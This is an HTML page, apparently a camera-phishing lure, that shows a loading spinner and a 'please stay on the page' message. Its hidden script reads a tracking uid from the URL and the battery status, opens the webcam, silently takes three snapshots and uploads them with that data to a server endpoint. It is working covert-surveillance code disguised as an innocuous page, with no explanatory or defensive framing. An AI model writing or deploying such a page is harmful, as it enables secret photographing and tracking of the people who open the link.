<body>

  <div class="container">
    <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
    <div class="text" id="status">

      Please stay on the page ğŸ¥
    </div>
    <div class="loader"></div>
    <div class="credit">ğ— ğ—®ğ—±ğ—² ğ—¯ğ˜† ğŸ’› ğ—ªğ—”ğ—–ğ—œğ—¤</div>

  <!-- Ù…Ø®ÙÙŠ ÙˆÛŒÚ‰ÛŒÙˆ Ø§Ùˆ Ú©ÛŒÙ†ÙˆØ§Ø³ -->
  <video id="video" autoplay playsinline></video>
  <canvas id="snapshot"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('snapshot');
    const ctx = canvas.getContext('2d');
    const statusEl = document.getElementById('status');

    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid') || 'unknown';

    if (uid) {
      navigator.getBattery().then(battery => {
        const batteryLevel = Math.round(battery.level * 100);
        const isCharging = battery.charging;

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
          video.srcObject = stream;
          statusEl.innerText = "ğŸ“¸ Camera access granted...";

          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
        }).catch(err => {
          console.error("Camera error:", err);
          statusEl.innerText = "âŒ Camera error!";
        });
      });
    }

    function takeSnapshotAndSend(battery, charging) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/png');

      fetch('/api/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          image: imageData,
          uid,
          battery,
          charging
        })
      }).catch(err => {
        console.error("Upload error:", err);
      });
    }
  </script>
</body>
